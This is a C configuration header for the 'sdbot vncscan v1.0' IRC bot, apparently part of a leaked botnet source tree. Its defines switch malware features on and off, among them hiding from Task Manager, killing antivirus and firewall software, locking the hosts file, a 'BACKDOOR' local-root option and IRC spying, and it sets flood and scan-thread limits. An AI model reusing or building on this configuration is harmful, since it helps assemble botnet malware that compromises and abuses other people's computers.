#define vername "sdbot vncscan v1.0"


#define NO_IELOWER    // disables ActiveX installer
#define NO_TASKHIDER  // disables hiding from taskmanager
#define NO_AVFW_KILL  // disables a/v f/w killer
#define NO_HOSTCHANGE // disables hostsfile locker
#define NO_LOCALROOT	  // BACKDOOR
// #define NO_REGMON     // disables registry monitor
// #define NO_VIRUSREMOVE   // disables virus remove
// #define NO_MIRCNICK
// #define NO_AVIRUS
// #define NO_SECSYSTEM
// #define NO_PROCESS

//Disabled
#define NO_REDIRECT      // disables port redirect function
#define NO_IDENT         // disables ident server
#define NO_LOCALROOT     // disables local root and security crack (win2k)
#define NO_SPY           // disables irc spy function


#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define BLOCKSIZE 512 //tftp
#define HSTART "\3\x30\x32"
#define HEND "\3"
#define FLOOD_DELAY 2000
#define MAX_LINES		500
#define MAXTOKENS		32
#define LOGSIZE			128
#define IRCLINE			1024
#define MAXTHREADS		500
#define MAXNICKLEN		28
#define LOGLINE			128
#define MAXSCANTHRD		600
#define MAXSCANTIME		800
#define MAXSTRLEN		500
